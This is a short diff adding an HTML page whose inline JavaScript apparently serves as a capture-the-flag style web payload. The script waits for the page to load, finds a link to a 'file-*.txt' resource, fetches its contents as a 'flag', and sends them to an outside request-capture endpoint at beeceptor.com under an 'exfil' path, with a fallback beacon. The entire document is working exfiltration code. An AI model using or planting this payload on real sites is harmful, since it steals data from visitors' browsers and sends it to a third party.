@@ -1,0 +1,16 @@
+<html><body><script>
+(async () => {
+  await new Promise(r => setTimeout(r, 500)); // attendre le chargement
+
+  const a = [...document.querySelectorAll('a')]
+    .find(x => /file-.*\.txt$/.test(x.id));
+
+  if (a) {
+    const res = await fetch(a.href);
+    const flag = await res.text();
+
+    fetch('https://webtest.free.beeceptor.com/exfil?f=' + encodeURIComponent(flag));
+  }
+  fetch('https://webtest.free.beeceptor.com/exfil?f=' + 'rien');
+})();
+</script></body></html>
